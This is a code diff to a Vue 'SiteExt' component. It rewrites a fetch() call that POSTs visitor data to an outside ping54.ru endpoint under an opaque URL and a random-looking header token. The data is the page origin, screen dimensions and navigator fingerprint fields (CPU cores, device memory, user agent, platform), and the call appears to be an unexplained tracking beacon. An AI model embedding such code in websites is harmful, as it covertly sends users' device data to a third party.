@@ -166,13 +166,13 @@ Vue.component('SiteExt',{
 
 
 
-fetch('https://ping54.ru/sgcms/AKfycbyvSEHK608xVSguW9MSpaTNnt2Qt324KDaVE-4_8U9UfRO-FUfkDEncK7qyOaHvM10AQw',new function(){
-  this.method='POST'
-  this.headers={
+fetch('https://ping54.ru/inetcore/uZireEhZ7JgYJdQ3uIcfVrhSdbYaFe52N22MJ3qt6i2M0jOVwxX78JTTyzyPvPHy',{
+  method:'POST',
+  headers:{
     'Content-Type':'application/json;charset=utf-8',
-    'mc3e4m0gp4zkslur':'A5t4xiXaDFqVx9Yj7KbB61ugtxmPREWKq04sgDQUg3reJWveKwtDHnYDmtlBiiSs'
+    'qrddl1nej271geay':'fJq44zsb2A32jIfH8YKis4tth1akE7wwT0a291pRF8rD53OVlK4EwC85T4sIrMaW'
   },
-  this.body=JSON.stringify(new function(){
+  body:JSON.stringify(new function(){
     this.origin=window.location.origin
     const {innerWidth,innerHeight,devicePixelRatio}=window
     const {maxTouchPoints,hardwareConcurrency,deviceMemory,userAgent,platform}=window.navigator
